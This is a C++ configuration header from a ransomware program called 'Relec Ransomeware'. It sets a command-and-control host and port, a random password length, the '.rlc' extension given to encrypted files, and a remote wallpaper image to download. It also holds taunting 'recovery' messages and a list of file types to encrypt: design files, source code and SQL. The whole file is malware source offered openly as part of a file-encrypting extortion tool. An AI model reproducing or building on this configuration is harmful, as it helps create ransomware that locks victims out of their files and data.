#pragma once

#ifndef CONFIG
#define CONFIG

#include <set>

#define APPLICATION_NAME L"Relec Ransomeware"
#define RANDOM_PASSWORD_LENGTH 32
#define DEFAULT_ENCRYPT_EXTENSION "rlc"
#define HOST_NAME "127.0.0.1"
#define HOST_PORT 5000
#define VALIDATION_MESSAGE L"Happy to you. All files have been recovered. Don't infect again. ;)"
#define CHEATER_MESSAGE L"Are you kidding me?"

#define WALLPAPER_HOST "2.bp.blogspot.com"
#define WALLPAPER_PATH "/-M_Zaje-cmlI/UEGFvq6l_tI/AAAAAAAAAJ4/P9lOHN3bt0Q/s1600/ghost+hades+wallpaper.jpg"
#define WALLPAPER_PORT 80
#define WALLPAPER_LOCAL_NAME "\\w.jpg"

#if _DEBUG
#define SEARCH_PATH "test"
#else 
#define SEARCH_PATH ""
#endif

namespace config {

	static std::set < std::string > ENCRYPT_EXTENSIONS;
	static std::set < std::string > DECRPYTION_EXTENSIONS;

	static void init()
	{
		ENCRYPT_EXTENSIONS.clear();
		DECRPYTION_EXTENSIONS.clear();

		ENCRYPT_EXTENSIONS.insert("ai");
		ENCRYPT_EXTENSIONS.insert("psd");
		ENCRYPT_EXTENSIONS.insert("dwg");
		ENCRYPT_EXTENSIONS.insert("cs");
		ENCRYPT_EXTENSIONS.insert("java");
		ENCRYPT_EXTENSIONS.insert("php");
		ENCRYPT_EXTENSIONS.insert("cpp");
		ENCRYPT_EXTENSIONS.insert("hpp");
		ENCRYPT_EXTENSIONS.insert("c");
		ENCRYPT_EXTENSIONS.insert("h");
		ENCRYPT_EXTENSIONS.insert("js");
		ENCRYPT_EXTENSIONS.insert("sql");

		DECRPYTION_EXTENSIONS.insert(DEFAULT_ENCRYPT_EXTENSION);
	}
}

#endif